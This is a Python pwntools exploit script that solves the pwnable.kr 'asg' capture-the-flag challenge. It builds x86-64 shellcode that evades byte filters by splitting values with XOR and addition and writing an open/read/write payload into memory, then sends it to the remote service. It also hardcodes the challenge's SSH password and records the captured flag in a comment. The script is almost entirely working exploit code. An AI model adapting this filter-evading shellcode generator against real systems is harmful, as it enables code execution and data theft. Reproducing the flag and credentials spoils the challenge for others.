#!/usr/bin/env python3

from pwn import *
import traceback
exe = ELF("/home/p3qch/ctf/pwnablekr/asg/asg")

context.binary = exe
context.arch = 'amd64'


class Reg:


    def __init__(self, name, size = 64):
        self.name = name
        self.size = size
        self.pop = False
        self.push = False
        self.mov_imd_qwd = False
        self.mov_imd_into_addr = False # mov a dword immediate into the address inside the reg
        self.inc = False
        self.mov_rip_into = False
    
    def __repr__(self):
        result  = f'"{self.name}"'
        result += '|poppable' if self.pop else ''
        result += '|pushable' if self.push else ''
        result += '|mov imd qw into' if self.mov_imd_qwd else ''
        result += '|mov imd dw into addr' if self.mov_imd_into_addr else ''
        result += '|inc' if self.inc else ''
        result += '|mov rip into' if self.mov_rip_into else ''
        return "<" + result + ">"
reg_names64 = ["rax","rbx","rcx","rdx","rbp","rsp","rsi","rdi", "r8","r9","r10","r11","r12","r13","r14","r15"]
regs64 = [Reg(name) for name in reg_names64]
pops64 =   [b'X', b'[', b'Y', b'Z', b']', b'\\', b'^', b'_', b'AX', b'AY', b'AZ', b'A[', b'A\\', b'A]', b'A^', b'A_'] # matching pops for each reg
pushs64 = [b'P',b'S',b'Q',b'R',b'U',b'T',b'V',b'W',b'AP',b'AQ',b'AR',b'AS',b'AT',b'AU',b'AV',b'AW']
mov_imd_qwd64 = [b'H\xb8',b'H\xbb',b'H\xb9',b'H\xba',b'H\xbd',b'H\xbc',b'H\xbe',b'H\xbf',b'I\xb8',b'I\xb9',b'I\xba',b'I\xbb',b'I\xbc',b'I\xbd',b'I\xbe',b'I\xbf'] # matching mov of imd into the regs
mov_imd_into_addr64 = [b'H\xc7\x00', b'H\xc7\x03', b'H\xc7\x01', b'H\xc7\x02', b'H\xc7E\x00', b'H\xc7\x04$', b'H\xc7\x06', b'H\xc7\x07', b'I\xc7\x00', b'I\xc7\x01', b'I\xc7\x02', b'I\xc7\x03', b'I\xc7\x04$', b'I\xc7E\x00', b'I\xc7\x06', b'I\xc7\x07']
inc64 = [b'H\xff\xc0', b'H\xff\xc3', b'H\xff\xc1', b'H\xff\xc2', b'H\xff\xc5', b'H\xff\xc4', b'H\xff\xc6', b'H\xff\xc7', b'I\xff\xc0', b'I\xff\xc1', b'I\xff\xc2', b'I\xff\xc3', b'I\xff\xc4', b'I\xff\xc5', b'I\xff\xc6', b'I\xff\xc7']
mov_rip_into64 = [b'H\x8d\x05\x00\x00\x00\x00', b'H\x8d\x1d\x00\x00\x00\x00', b'H\x8d\r\x00\x00\x00\x00', b'H\x8d\x15\x00\x00\x00\x00', b'H\x8d-\x00\x00\x00\x00', b'H\x8d%\x00\x00\x00\x00', b'H\x8d5\x00\x00\x00\x00', b'H\x8d=\x00\x00\x00\x00', b'L\x8d\x05\x00\x00\x00\x00', b'L\x8d\r\x00\x00\x00\x00', b'L\x8d\x15\x00\x00\x00\x00', b'L\x8d\x1d\x00\x00\x00\x00', b'L\x8d%\x00\x00\x00\x00', b'L\x8d-\x00\x00\x00\x00', b'L\x8d5\x00\x00\x00\x00', b'L\x8d=\x00\x00\x00\x00']
r = 0

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    elif args.SSH_LOCAL:
        session = ssh('asg','pwnable.kr', 2222, 'Mak1ng_shelLcodE_i5_veRy_eaSy')
        
        r = session.process(["/home/asg/asg"])
        gdb.attach(r)
    else:
        r = remote('pwnable.kr', 9025)

    return r

def generate_non_filtered_xor_pair(a, filtered_bytes):
    a_bytes = a.to_bytes(8, 'little')  # Break down 'a' into 8 bytes
    a1 = 0
    a2 = 0
    
    for i, byte in enumerate(a_bytes):
        # Initialize possible candidates for a1, a2 to 0 at this byte position
        candidate_a1 = 0
        candidate_a2 = byte
        
        # Check if direct placing of byte and 0 works
        if byte in filtered_bytes or 0 in filtered_bytes:
            # If not, we find other candidates by flipping bits until we find valid ones
            found = False
            for j in range(256):  # Try all byte values
                candidate_a1 = j
                candidate_a2 = byte ^ j  # XOR to maintain the original byte
                if candidate_a1 not in filtered_bytes and candidate_a2 not in filtered_bytes:
                    found = True
                    break
            if not found:
                raise ValueError("No valid combination found that avoids filtered bytes")
        else:
            candidate_a1 = 0
            candidate_a2 = byte
        
        # Shift candidates into the correct byte position and add to a1, a2
        a1 |= (candidate_a1 << (i * 8))
        a2 |= (candidate_a2 << (i * 8))
    
    return a1, a2

def addition_split(a, filtered_bytes):
    a1 = 0
    a2 = 0
    filtered_a1 = 0
    filtered_a2 = 0

    for i in range(8):  # Assuming quadword is 8 bytes long
        byte = (a >> (i * 8)) & 0xFF
        if byte in filtered_bytes:
            if bin(a1).count('1') < bin(a2).count('1'):
                a1 |= byte << (i * 8)
                filtered_a1 |= byte << (i * 8)
            else:
                a2 |= byte << (i * 8)
                filtered_a2 |= byte << (i * 8)
        else:
            if random.choice([True, False]):  # Assign randomly to a1 or a2
                a1 |= byte << (i * 8)
            else:
                a2 |= byte << (i * 8)

    # Ensure that the addition of a1 and a2 equals a
    if (a1 + a2) == a:
        return a1, a2
    else:
        return None, None  # No valid split found

def is_filtered(bytes_, filtered):
    for i in bytes_:
        if i in filtered:
            return True
    return False

def find_closest_unfiltered_byte(byte, filtered):
    lower = byte
    higher = byte
    while True:
        lower -= 1
        higher += 1
        if lower not in filtered:
            return lower
        if higher not in filtered:
            return higher
    return 'wtf'

def set_possibilities(filtered):
    for i in range(len(regs64)):
        regs64[i].pop =  pops64[i] if not is_filtered(pops64[i], filtered) else False
        regs64[i].mov_imd_qwd = mov_imd_qwd64[i] if not is_filtered(mov_imd_qwd64[i], filtered) else False
        regs64[i].mov_imd_into_addr = mov_imd_into_addr64[i] if not is_filtered(mov_imd_into_addr64[i], filtered) else False
        regs64[i].push =  pushs64[i] if not is_filtered(pushs64[i], filtered) else False
        regs64[i].inc =  inc64[i] if not is_filtered(inc64[i], filtered) else False
        regs64[i].mov_rip_into = mov_rip_into64[i] if not is_filtered(mov_rip_into64[i], filtered) else False

def set_reg(reg: Reg, n, filtered, ignore = []) -> bytes:
    """sets a register to a number. Assumes number is unfiltered"""

    if reg.mov_imd_qwd:
        return reg.mov_imd_qwd + p64(n)
    if reg.pop:
        chosen: Reg = None
        for i in filter(lambda x: x.name not in ignore,regs64):
            if i.push and i.mov_imd_qwd:
                chosen = i
        if chosen:
            return chosen.mov_imd_qwd + p64(n) + chosen.push + reg.pop
    error('the register ' + reg.name + ' is unsettable.')

def get_settable_regs():
    possible_regs = []
    for i in regs64:  # get settable regs
        if i.pop or i.mov_imd_qwd and i.name != 'rsp': 
            possible_regs.append(i)
    return possible_regs

def _set_reg_filtered(reg, n, filtered, ignore=[]):
    if not is_filtered(p64(n), filtered):
        return set_reg(reg, n, filtered)
    
    if n == 0:
        xor_itself = asm(f'xor {reg.name}, {reg.name}')
        if not is_filtered(xor_itself, filtered):
            return xor_itself

    # if we can xor its the best
    possible_regs = filter(lambda x: x.name not in ignore,get_settable_regs())

    if not is_filtered(b'1', filtered): # xoring is supposedly possible

        for second_reg in possible_regs:
            if reg.name == second_reg.name:
                continue
            xor = asm(f'xor {reg.name}, {second_reg.name}')
            if not is_filtered(xor, filtered):
                n1, n2 = generate_non_filtered_xor_pair(n, filtered)
                return (set_reg(reg, n1, filtered) + set_reg(second_reg, n2, filtered, ignore=ignore + [reg.name]) + xor)
    elif not is_filtered(b'\x01', filtered):
        for second_reg in possible_regs:
            if reg.name == second_reg.name:
                continue
            add = asm(f'add {reg.name}, {second_reg.name}')
            if not is_filtered(add, filtered):
                n1, n2 = addition_split(n, filtered)
                return (set_reg(reg, n1, filtered) + set_reg(second_reg, n2, filtered, ignore=ignore + [reg.name]) + add)

    error('tough luck :/')

def set_reg_filtered(reg, n, filtered, set_regs = ['rsp']):
    try:
        return _set_reg_filtered(reg, n, filtered, ignore =set_regs)
    except:
        regs = filter(lambda x: x.name not in set_regs, regs64)
        for second_reg in regs:
            mov = asm(f'mov {reg.name}, {second_reg.name}')
            if not is_filtered(mov, filtered):
                try:
                    return _set_reg_filtered(regs64[reg_names64.index(second_reg_name)], n, filtered) + mov
                except:
                    continue
    error('nothing ever works.')

def set_some_reg_filtered(n, filtered):
    possible_regs = filter(lambda x: x.push and x.name  !='rsp',get_settable_regs())
    for reg in possible_regs:
        try:
            return (set_reg_filtered(reg, n, filtered), reg)
        except:
            traceback.print_exc()
    error('nothing works :(')



def put_str_to_stack(string, filtered):
    chunks = [int(enhex(string[i: i + 8][::-1]), 16) for i in range(0, len(string), 8)]

    result = b''
    code, reg = set_some_reg_filtered(0, filtered)
    result += code + reg.push
    for chunk in chunks[::-1]:
        code, reg = set_some_reg_filtered(chunk, filtered)
        result += code
        result += reg.push

    return result

def mov_sp_to_reg(reg, filtered, ignore =['rsp']):
    rsp = regs64[5]
    if reg.pop and rsp.push:   
        return rsp.push + reg.pop
    
    mov = asm(f'mov {reg.name}, rsp')
    if not is_filtered(mov, filtered):
        return mov
    
    add = asm(f'add {reg.name}, rsp')
    if not is_filtered(add, filtered):
        return set_reg_filtered(reg, 0, filtered) + add

    for sreg in filter(lambda r: r.name != 'rsp' and r.name not in ignore,regs64):
        mov = asm(f'mov {sreg.name}, rsp\nmov {reg.name}, {sreg.name}')

        if not is_filtered(mov, filtered):
            return mov
            

    error('impossible to mov rsp into this reg')

def mov_rip_to_reg(reg: Reg, filtered):
    call_next = b"\xe8\x00\x00\x00\x00" # relative call to next instruction
    if reg.mov_rip_into:
        return reg.mov_rip_into
    elif reg.pop and not is_filtered(b'\xe8\x00', filtered):
        return call_next + reg.pop
    return None # no way to set this reg to rip

def inc_eight(reg: Reg, filtered):
    """add 8 to a register"""
    add = asm(f'add {reg.name}, 8')
    if not is_filtered(add, filtered):
        return add
    lea = asm(f'lea {reg.name}, [{reg.name} + 8]')
    if not is_filtered(lea, filtered):
        return lea
    if reg.inc:
        return reg.inc * 8

    return None

def base_and(reg, filtered):
    if reg.name[-1] == 'x':
        short_and = asm(f'and {reg.name[1:]}, 0xf000')
        if not is_filtered(short_and, filtered):
            return short_and

    and_ = asm(f'and {reg.name}, 0xfffffffffffff000')
    if not is_filtered(and_, filtered):
        return and_

    settable_regs = get_settable_regs()
    for and_reg in settable_regs:
        if and_reg.name == reg.name:
            continue
        and_ = asm(f'and {reg.name}, {and_reg.name}')
        if not is_filtered(and_, filtered):
            return set_reg_filtered(and_reg, 0xfffffffffffff000, filtered, set_regs=['rsp', reg.name]) + and_

    shifting = asm(f'shr {reg.name}, 12\n shl {reg.name}, 12')
    if not is_filtered(shifting, filtered):
        return shifting

    return None

    
def goto_addr_in_reg(reg: Reg, filtered):
    call = asm('call ' + reg.name)
    if not is_filtered(call, filtered):
        return call
    jmp = asm('jmp ' + reg.name)
    if not is_filtered(jmp, filtered):
        return jmp

    settable_regs = get_settable_regs()

    for sreg in regs64:
        call = asm(f'mov {sreg.name},{reg.name}\ncall {sreg.name}')
        if not is_filtered(call, filtered):
            return call
        jmp = asm(f'mov {sreg.name},{reg.name}\njmp {sreg.name}')
        if not is_filtered(jmp, filtered):
            return jmp

    return None
    

def main():
    global r
    #while True:
    r = conn()
    SYSCALL = b"\x0f\x05"

    ############ SETUP ############

    r.recv(1024)
    r.sendline()
    r.recvuntil(b'these are filtered set of bytes:')
    r.recvline()
    filtered = r.recvuntil(b'flag is inside this file: [', drop=True)
    info(f"Filtered bytes: {list(filtered)}")
    flag_file = r.recvuntil(b']', drop=True)
    info(f"flag file: {flag_file}")
    r.recvuntil(b'give me your shellcode: ')

    set_possibilities(filtered)

    pprint(regs64)

    nice_regs = [(i, mov_rip_to_reg(i, filtered), inc_eight(i, filtered)) for i in filter(lambda x: x.name != 'rsp', regs64)]
    print('before filter')
    pprint(nice_regs)
    nice_regs = list(filter(lambda x: x[1] and x[2], nice_regs))
    print('after filter')
    pprint(nice_regs)

    info('rip candidates: ')
    pprint(nice_regs)
    settable_regs = get_settable_regs()
    chosen_rip_holder, chosen_reg_inc, chosen_reg_setter = None, None, None # reg that will hold the start of the mmaped segment. We'll use that to write code to there

    chosen_and_reg, chosen_and = None, None # a reg that we can use to bitwise AND the mmaped pointer to the start of the segment

    special_mov_reg, special_mov = None, None # reg that holds the value to be put into the memory, and the instruction to move that


    code = b''
    for rip_reg, setter, inc in nice_regs: # first we'll get the regs to hold rip and the ander
        for mover_reg in settable_regs:
            if rip_reg.name == mover_reg.name:
                continue
            mov = asm(f'mov [{rip_reg.name}], {mover_reg.name}')
            if not is_filtered(mov, filtered):
                chosen_rip_holder = rip_reg
                chosen_reg_inc = inc
                chosen_reg_setter = setter

                special_mov = mov
                special_mov_reg = mover_reg
                code += setter
                break
            if code:
                break

        if code:
            break

    if not code:
        error('no regs found :(')

    code += base_and(chosen_rip_holder, filtered)

    flag_chunks = [flag_file[i:i+8] for i in range(0, len(flag_file), 8)]

    actual_shellcode  = 'push 0\n'
    actual_shellcode += ''.join([f"mov rax, {int(enhex(chunk[::-1]), 16)}\npush rax\n" for chunk in flag_chunks[::-1]]) 
    actual_shellcode += shellcraft.open('rsp')
    actual_shellcode += shellcraft.read(5, 'rsp', 0x100)
    actual_shellcode += shellcraft.write(1, 'rsp', 0x100)
    actual_shellcode = asm(actual_shellcode) 


    chunked_sc = [actual_shellcode[i:i+8] for i in range(0, len(actual_shellcode), 8)]
    for chunk in chunked_sc:
        code += set_reg_filtered(special_mov_reg, int(enhex(chunk[::-1]), 16), filtered)
        code += special_mov
        code += chosen_reg_inc
    print(f'filtered: {is_filtered(code, filtered)}')

    code += base_and(chosen_rip_holder, filtered)
    code += goto_addr_in_reg(chosen_rip_holder, filtered)

    info("shellcode constructor: ")
    print(disasm(code))
    print(f'filtered: {is_filtered(code, filtered)}')
    
    if len(code) > 1000:
        error('code wayyyyy too long... D:')

    for i in range(256):
        if i not in filtered:
            code += i.to_bytes(1) * (1000 - len(code) )


    print(disasm(actual_shellcode))
    # with open('./sh', 'wb') as f:
    #     f.write(code)

    print(disasm(code))
    print("filtered? " + str(is_filtered(code, filtered)))

    info('sending')
    # gdb.attach(r, gdbscript='b *0x000000000040141a\nb *0x00000000004014b2')
    if ord("\n") not in filtered:
        r.sendline(code)
    else:
        r.send(code)
    info('waiting for buena suerte')
    r.interactive()


    # FLAG : M4nually_m4k1ing_sh3llc0de_is_m0re_fuN



if __name__ == "__main__":
    if True:
        x = ''
        while True:
            try:
                main()
            except KeyboardInterrupt:
                exit(1)

            except Exception as e:
                traceback.print_exc()
                r.close()

            #x = input('keep going?')
    else:
        artificial_main()
